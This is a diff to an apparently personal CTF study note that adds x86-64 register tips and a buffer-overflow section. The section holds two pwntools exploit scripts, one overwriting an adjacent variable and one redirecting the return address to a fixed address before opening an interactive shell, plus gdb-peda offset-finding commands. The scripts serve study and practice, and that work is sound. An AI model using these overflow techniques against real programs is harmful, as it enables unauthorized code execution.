@@ -2,6 +2,7 @@
 - In this specific order, those are the registers used to pass parameters to functions:
   - `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`, and so on with numbers;
   - **NOTE:** you can replace the `r` with `e` and it's the same register but with a different name (it indicates only that the size rappresented is different);
+- To return a value, usually the registers `rax` (=`eax`);
 - `call qword ptr [<registername>]`: it calls the function that's pointed by the pointer value inside of the register (i.e. call qword ptr[rbx]);
 - How the JUMP instruction works? (the example is only with `jz` but it's the same logic for every jump):
   - if the instruction is `jz <address1> <address2>`, if the condition is met (in this specific case the ZERO_FLAG is at 0), we will jump at `<address1>` else we jump at `<address2>`;
@@ -49,3 +50,56 @@ After that you can:
 - run `exit`: to exit gdb;
 - run `info registers`: this will show you the values inside every single register at a specific point in the code. You can combine the information of the registers during a specific breakpoint, with the `x/s` command, to analyze each value, inspecting parameters or return values as you wish.
 # Pwning
+## Buffer Overflow
+To solve those kind of challenges make sure to have a deep understanding on how memory works and how to use the basePointer/stackPointer to access values.
+
+Tricks for simple challenges:
+- If a buffer is contiguous in memory to a veriable, you can overwrite the variable exeding the buffer with the content you input in. All you have to do is to calculate the distance between the pointer of variable A to the pointer of variable B;
+- Before talking about `pwntools`, I want to let you know that you can check the architecture of the system that compiled the program by using: `checksec <programName>` (that could be useful if you need to know the size of the registers)(<u>for example when you need to create addresses that will be injected</u>);
+- We can use tools like `pwntools` (a python library) to generate inputs to send to a process (like in the following example):
+ ```python
+ #Importing the library
+ from pwn import *
+
+#Setting up the garbage and the message to inject
+garbage = "a" * 64
+msg = "H!gh"
+msgin = garbage + msg
+
+#Opening the process to attack
+p = process("./pwn0")
+
+#Sending the injected code
+p.sendline(msgin)
+
+#Retrieving the output of the program
+msgout = p.recvall()
+
+print("Output: \t", msgout)
+ ```
+
+- Another common thing from pwning is to call specific line of code (breaking the flow of the program) to execute it in unintended ways (for example you could jump to a specific address in memory if it's decided at runtime)(example below):
+```python
+from pwn import *
+
+#When you found at what pointer you want to jump to, you can generate that address in p64 with pwntools
+target_address = p64(0x4007A2)
+#Creation of the garbage and setting up of the message
+garbage = b"java" + b"a" * 28
+msgin = garbage + target_address
+
+#Opening the process
+p = process("./java")
+#Injecting the malicious input
+p.sendline(msgin)
+#Going in interactive mode (really usefull if you have to activate a shell and you want to use it manually)
+p.interactive()
+```
+### Executing using the return call of a function
+We can execute something if we achieve to go outside the buffer and overwrite the base pointer and the return call.
+The difficult part is that we have to understand what's the distance between the end of the buffer and the beginning of the return call register.
+To achieve that we use `gdb-peda` (a special version of gdb to test security vulnerabilities).
+Commands to use:
+- `pattern_create <numberOfCharForBuffer> <nameOfTheFileWhereThePatternWillBeStored>`: will create a pattern to use with the next command;
+  - You can use `run < <nameOfTheFileWhereThePatternIsStored>`, to input the pattern inside of the program (you obviusly have to open it with gdb), and see (if you generated a buffer overflow) the information inside every register, and additional information that coul be useful paired with the next command.
+- `pattern_search`: it uses the pattern created before as an input for a program. The good part is that it will tell you what are the registries where group of chars from the pattern have been spotted (and their distance from the stack pointer)
